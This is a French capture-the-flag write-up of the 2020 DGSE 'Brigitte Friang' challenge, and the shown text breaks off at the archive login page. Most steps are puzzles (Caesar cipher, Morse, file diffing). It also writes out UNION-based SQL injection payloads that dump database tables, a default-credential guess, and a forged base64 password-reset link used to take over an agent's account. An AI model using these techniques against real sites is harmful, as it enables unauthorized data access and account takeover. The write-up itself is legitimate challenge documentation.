# Challenge Brigitte Friang

## Résumé
Après le challenge Richelieu, la DGSE a mis en ligne un nouveau challenge qui a lieu du 24/10/2020 au 11/11/2020.

On y accédait depuis le site https://challengecybersec.fr/

## Entrée dans le challenge.
En tapant l'url, nous arrivons sur la page suivante : ![Accueil](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture1.PNG)

Nous affichons le code source de la page afin de trouver des indices: ![CodeSource](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture2.PNG) 
Là, on voit une ligne commentée `/static/message-secret.html`

En tapant cette url dans le navigateur, nous arrivons sur la page suivante : ![Cesar](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture3.PNG)
Nous remarquons trois choses en arrivant sur la page : tout d'abord, la présence de 4 caractères en gras : `joha`. Nous les notons et les mettons de coté.
Ensuite, le message en lui-même. En effet, il n'est pas lisible mais n'a pas un chiffrement fort car la structure du texte est conservée, ce qui fait penser au chiffrement de César. Cette hypothèse est confirmée par le troisième point : le titre de la page, qui est Cesar.

Pour ceux qui ne connaissent pas le chiffrement de César, il s'agit d'un décallage de lettres par un nombre compris, entre 1 et 25, choisit par celui qui chiffre. Pour retrouver facilement, le chiffre du décallage, deux techniques s'offrent à nous : 
  * la première est de compter les occurances des lettres présentes dans le message. Celle qui apparait le plus a de grande chance de correspondre au E car c'est la lettre la plus utilisée en français. L'inconvénient de cette technique est qu'elle peut vite devenir longue si on le fait à la main et si le texte comporte des accents à la base, ça gêne cette analyse.
  * la deuxième, celle que j'ai utilisé, est de travailler à partir d'une hypothèse grâce à un mot. J'ai choisi le mot premier mot d'une phrase : `LssL`. Sa structure fait fortement penser au mot 'elle'. Pour vérifier cette hypothèse, on compte le décallage (nombre de lettres) entre le L et le E, ce qui nous donne 7. On fait le même calcule entre S et L, ça nous donne le même résultat. Il semble que nous ayons trouvé la clef.
Pour récupérer le code, il suffit d'utiliser un des nombreux sites qui le propose.
Le résultat est le texte suivant : ![Cesar déchiffré](https://github.com/sgranel/challengeBrigitteFriang/blob/main/Cesar_clair.txt).
 
Le texte nous raconte la vie de Briggite Friang. On y apprend qu'elle cachait des messages dans des foulards et que le texte comporte une url à taper pour accéder à la suite, suivi de la barre oblique.

Ce qui nous ramène aux 4 caractères trouvés avant. En appliquant le déchiffrement de César, on récupère le mot : chat.

En mettant, ce mot dans l'url, nous accédons au site suivant : ![Chat](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture4.PNG) 

## Le chat
Il est composé de plusieurs canaux, un pour chaque interlocuteur. Il y a tout d'abord Armand Richelieu, qui est le Directeur et qui nous explique que le service a appris que le gouvernement Evil va mettre en place une répression meurtrière contre sa population. Notre mission est d'arriver à déjouer cela.
Pour ça, nous devons parler avec les 4 autres membres du chat qui représentent chacun un service. Nous avons :
* Antoine Rossignol : Service Crypto
* Jéméry Nitel : Service Web
* Blaise Pascal : Service Algo
* Alphonse Bertillon : Service Forensic/

### Antoine Rossignol
Il nous donne un fichier `echange.txt`, un `compte-rendu.pdf`, un `layout.pdf` et `archive_chiffre`.
Il nous explique qu'ils travaillent avec Eve Descartes qui est une spécialiste des attaques matérielles et qu'elle travaille dans les salles blanches d'ESIEE Paris.
Elle a analysé un matériel intercepté qui appartient au gouvernement Evil Gouv et qu'elle nous a envoyé ses résultats dans un compte-rendu protégé par un mot de passe.
On affiche le pdf `compte rendu`, où y voit une adresse mail et un numéro de téléphone. Une recherche google ne nous apprend rien sur ces deux éléments. Après avoir cherché des info dans le document, on ne trouve rien. Aussi, on envoie un email à Eve car Antoine nous conseille de prendre contact avec elle. Elle nous répond qu'elle est en vacances, mais que son numéro est joignable. 
![Eve Descartes](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture12.PNG)
On appelle, et on entend une suite de bip courts et longs, ce qui fait penser directement penser à du morse. On installe une application d'enregistrement d'appel (CallBox par exemple) et on rappelle. Ainsi, nous avons un fichier mp3 du message qu'on peut re-écouter tranquillement. A force d'écouter le message, on trouve le mot "resistance" qui nous permet d'ouvrir le pdf layout.
On y voit 16x16 éléments dont certains sont "cassés". On cherche si ces éléments cassés ont un intérêt ou non.
Instinctivement, un part sur une clef en hexadecimal afin d'essayer d'ouvrir l'archive, sans succès.

### Jéméremy Nitel
Il nous explique qu'il a trouvé le site web d'un entrepôt basé à Evil Country qui sert pour l'attaque prévue contre les résistants. Il nous demande de trouver l'adresse mail d'un agent du gouvernement ennemi afin de pouvoir prouver ce qui se prépare. Le site se trouve à l'adresse suivante : https://challengecybersec.fr/4e9033c6eacf38dc2a5df7a14526bec1  
Ainsi il faudra qu'on trouve un moyen de prender un billet sur le site d'AirEvil, unique compagnie aérienne qui s'y rend, grace aux informations récupérées sur Stockos. Le site se trouve :  https://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c. Il faudra réservez le vol ABDJI6 du 26/10/2020 au 28/10/2020 de Bad City à Evil City.

#### Stockos
On se connecte sur le site de Stockos: 
![Stockos](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture5.PNG) 
Pour se connecter, on essaie tout bêtement `admin/admin` car Jéméry Nitel nous a dit que les mots de passes qui avaient fuités de cette plateforme n'étaient pas très original.

Une fois dans le site, on se balade et on ne trouve aucune information facilement (et oui, ça n'aurait pas été marrant :) ). Par contre, on tombe sur un champ texte permettant de faire des recherches dans la page de gestion des stocks.
Ca sent la faille sql. Aussi pour s'en assurer, on tape `'` et on lance la recherche. Le site nous remonte une erreur SQL :
![Stockos SQLI](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture6.PNG)
Pour ne pas s'embêter à chercher à la main quelles sont les tables présentes, on va profiter de cette faille pour récupérer les noms des tables. Pour cela, on met le code suivant dans le champ texte : `' UNION ALL SELECT 1, 2, 3, 4, table_name FROM information_schema.tables #`
Gentiment, le site nous renvoie les noms des tables suivantes : 
* customer
* orders,
* section
* supplier

Grâce à cette information, nous récupérons le nom des colonnes de la tables customer, en tapant le code suivant, toujours dans la barre de recherche :
`	' UNION ALL SELECT 1, 2, 3, 4, column_name FROM information_schema.columns WHERE table_name='customer' #`
On récupère le nom des colonnes suivantes : 
* id
* name
* delivery_address
* signup_date
* email

Avec ces deux types d'informations, nous récupérons la liste des clients présents dans la bdd, avec le code suivant: 
`	' UNION ALL SELECT id, name, delivery_address, signup_date, email FROM customer #`
	
Ce qui nous donne une liste où on repère les deux adresses suivantes qui sont suspectes :
*	11 	Evil Corp 	1056 5th Avenue, New York City, New York, USA 	2015-10-21 00:00:00 	orders@ecorp.zz
*	12 	Evil Gouv 	2056 Evil Road, Evil City, Death State, Evil Country 	2015-10-21 00:00:00 	agent.malice@secret.evil.gov.ev

![Stockos mail](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture7.PNG) 
	
Ensuite, nous récupérons le noms des colonnes de la tables orders:
`	' UNION ALL SELECT 1, 2, 3, 4, column_name FROM information_schema.columns WHERE table_name='orders' #`

Ce qui nous donne : 
* id
* item_name
* order_status
* section
* order_date
* delivery_date
* customer
* confidential
* supplier

Ainsi, nous récupérons les achats présents dans la bdd:
`	' UNION ALL SELECT item_name, supplier, confidential, customer, section FROM orders where customer = 12 #`

Ce qui nous donne des achats suspects suivant : 
* Phosgène 	1 	[object Object] 	12 	6
* Batrachotoxine 	1 	[object Object] 	12 	6
* Ricine 	1 	[object Object] 	12 	6
* Tétraodontoxine 	1 	[object Object] 	12 	6
* Uranium enrichi 	1 	[object Object] 	12 	6
* N,N-Diisopropylaminoethanol 	1 	[object Object] 	12 	6

Pour finir, nous allons nous intéresser à la table des clients. Pour cela nous récupérons le noms des colonnes de la tables supplier:
`	' UNION ALL SELECT 1, 2, 3, 4, column_name FROM information_schema.columns WHERE table_name='supplier' #` 

Ce qui nous donne : 
* id
* name
* address
* website
	
Et nous récupération le contenu de la tables supplier :
`	' UNION ALL SELECT 1, id, name, address, website FROM supplier #`

Ce qui nous donne : 
* 1 	EvilChems 	666 Breezewood Court, Evil Town, Agony State, Evil Country 	http://evil-chems.zz/
* 2 	Poseidon E 	3615 Woodside Circle, Panama City, FL, USA 	http://poseidon.zz/
* 3 	Hauer Metallurgy 	1794 Wayside Lane, California, CA, USA 	http://hauer-metal.zz/
* 4 	Robco Industries 	4488 Clay Street, Indianapolis, IN, USA 	http://robco.zz/
* 5 	Dharma Corp 	92 Gadd Avenue, BUMBUNGA, SA, Australia 	http://dharma.zz/

Au final, Stockos nous a appris l'adresse mail de l'agent qui a passé un commande sur le plateforme : agent.malice@secret.evil.gov.ev

#### Air Evil
Nous allons maintenant nous intéresser au site des billets d'avion afin d'essayer de prendre notre billet.
![Air Evil](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture13.PNG)

On tente de se connecter sur Evil Air avec l'adresse mail `agent.malice@secret.evil.gov.ev` et `test` en mot de passe. Nous obtenons la réponse suivante : mot passe incorrect
Nous faisons la même manipulation avec une adresse mail inventée `fsdfsd1239ssfsf@fsfds.fr` et `test` en mot de passe. Le site nous répond que l'adresse mail n'existe pas. 
Ainsi, nous savons que l'adresse mail `agent.malice@secret.evil.gov.ev` est présente dans leur système. Il ne ous reste plus qu'à trouver le mot de passe.

Pour cela, deux options s'offrent à nous : la réflexion et le brute force.
La deuxième consiste à utiliser un dictionnaire et de tenter tous les mots de passe jusqu'à trouver le bon.

Personnellement, la première option m'intéresse plus. Donc va pour la réflexion.

Après avoir fouillé le site, on va sur la page d'inscription, où on voit le message suivant :
![Air Evil: Inscription](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture14.PNG)
Ce qui nous montre qu'on est sur la bonne voie.

On crée un compte avec une adresse mail jetable (yopmail). On reçoit un mail de validation où on voit que l'url comporte une base64 à la fin.
On décode cette base64 et on voit qu'il s'agit de notre adresse mail.
On n'oublie pas de valider notre adresse mail. :)

Ensuite, on utilise l'action de changement de mot de passe et on reçoit le mail suivant :
![Air Evil: reset](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture8.PNG)
On trouve la même base64 dans l'url de réinitialisation du mot de passe. On clique dessus pour voir ce qu'on obtient :
![Air Evil: reset mon compte](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture9.PNG)
On prend l'adresse mail de l'agent malice et on l'encode en base64, ce qui nous donne l'url suivante : http://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/reset/YWdlbnQubWFsaWNlQHNlY3JldC5ldmlsLmdvdi5ldg==

Pour encoder/décoder du base64, les outils ne manquent pas sur le net, mais aussi en python ou même par burp.
Lorsqu'on rentre l'url, nous arrivons sur la page 
![Air Evil: reset du compte de l'agent](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture10.PNG)

Au vu du mot de passe, on voit que l'attaque par force brute n'était pas une bonne solution.
On utilise l'adresse mail de l'agent et son mot de passe, ce qui nous donne un QRCode. En le scannant avec notre smartphone, on obtient un flag que nous donnons à Jéméry Nitel :
![Flag 1](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Screenshot_flag_web.jpg)

Pour nous remercier, il nous donne une capture réseau chiffré en TLS1.0.

### Blaise Pascal
#### Les différences entre deux fichiers
Blaise Pascal nous donne deux fichiers (`original.txt` et `intercept.txt`) où il nous dit que des caractères ont été ajoutés dans le second et qu'il faut qu'on arrive à les récupérer et à retrouver ce que c'est.
En commençant à regarder les deux fichiers, il apparait qu'il ne sera pas possible de le faire à la main. On écrit donc un petit script en python qui nous récupère tous ces fameux caractères en plus.
Ca donne un fichier comportant plus de 5000 caractères (`message_recuperere.txt`).

En écrivant un petit script python (`decode_base64.py`), on obtient une longue chaine de caractère. En la regardant, on voit au début JFIF. En cherchant sur internet, on voit qu'il s'agit d'un format d'image. On renomme le fichier décodé de .txt à .jfif et une image apparait.

#### Le site des optimisations des stocks
On voit une chaine de caractères. On les prend et on les met dans un navigateur, ce qui nous renvoi une erreur 404. Têtu, je retente mais en mettant les caractères en minuscule cette fois-ci. On arrive sur une page nous proposant de télécharger une archive.
Il faut qu'on aide le gouvernement Evil à ranger ces stocks dans différents entreprôts sans dépasser la valeur.

Pour ne pas s'embêter, on a encore recours à python et on écrit un petit script `remplissage.py` (peut-être pas le plus optimisé, mais qui fonctionne).
Ca nous donne une nouvelle url : /9bcb53d26eab7e9e08cc9ffae4396b48

#### Le blog des digest
En arrivant sur le site, on nous apprend qu'il faut parcourir le site pour trouver chaque digest présent dans les posts (au nombre de 1000).
N'ayant pas envie de parcourir tout à la main, on fait un petit bash qui le fera pour nous :
`for i in {1..1000}
do
curl https://challengecybersec.fr/9bcb53d26eab7e9e08cc9ffae4396b48/blog/post/$i | grep partial-proof > test$i.txt;
done`
Comme il reste de la "polution" dans les différents fichiers, on écrit un petit script python qui va récupérer que les parties qui nous intéressent et nous renvoie le md5 du tout : `digest.py`.

On obtient alors une nouvelle url nous permettant d'arriver sur la page de connection du site Evil Gouv Archives.
![Url des archives d'Evil Gouv](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture15.jpg)

![Page de login des archives d'Evil Gouv](https://raw.githubusercontent.com/sgranel/challengeBrigitteFriang/main/Capture16.jpg)
On arrive sur le site qui nous demande de nous connecter. On regarde le code source de la page et on voit que lorsqu'on clique sur le bouton `Se conncter`, du javascript est appelé. S'il renvoie 0, on a un message d'erreur. S'il renvoie 1, on est connecté et redirigé vers la page qui correspond à notre login. Pas de chance, on ne pourra pas simplement forcer la valeur 1. On regarde alors le fichier `login.js`, qui est écrit en hexadécimal.
